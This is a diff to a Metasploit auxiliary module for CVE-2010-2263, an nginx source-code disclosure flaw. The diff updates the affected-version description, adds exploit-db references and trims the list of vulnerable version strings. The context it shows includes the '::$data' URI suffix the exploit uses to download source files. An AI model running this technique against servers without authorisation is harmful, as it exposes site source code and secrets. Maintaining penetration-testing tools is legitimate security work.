@@ -23,13 +23,16 @@ class Metasploit3 < Msf::Auxiliary
 			'Version'        => '$Revision$',
 			'Description'    => %q{
 					This module exploits a source code disclosure/download vulnerability in
-				versions of the nginx web server between 0.7.56 and 0.8.40 (inclusive).
+				versions 0.7 and 0.8 of the nginx web server. Versions 0.7.66 and 0.8.40 
+				correct this vulnerability.
 			},
 			'References'     =>
 				[
 					[ 'CVE', '2010-2263' ],
 					[ 'OSVDB', '65531' ],
-					[ 'BID', '40760' ]
+					[ 'BID', '40760' ],
+					[ 'URL', 'http://www.exploit-db.com/exploits/13818/' ],
+					[ 'URL', 'http://www.exploit-db.com/exploits/13822/' ]
 				],
 			'Author'         =>
 				[
@@ -54,12 +57,14 @@ class Metasploit3 < Msf::Auxiliary
 		path_save = datastore['PATH_SAVE']
 
 		vuln_versions = [
+			# 0.7
 			"nginx/0.7.56","nginx/0.7.58","nginx/0.7.59",
 			"nginx/0.7.60","nginx/0.7.61","nginx/0.7.62",
 			"nginx/0.7.63","nginx/0.7.64","nginx/0.7.65",
+			# 0.8
 			"nginx/0.8.33","nginx/0.8.34","nginx/0.8.35",
 			"nginx/0.8.36","nginx/0.8.37","nginx/0.8.38",
-			"nginx/0.8.39","nginx/0.8.40"
+			"nginx/0.8.39"
 		]
 
 		get_source = Rex::Text.uri_encode("::$data")
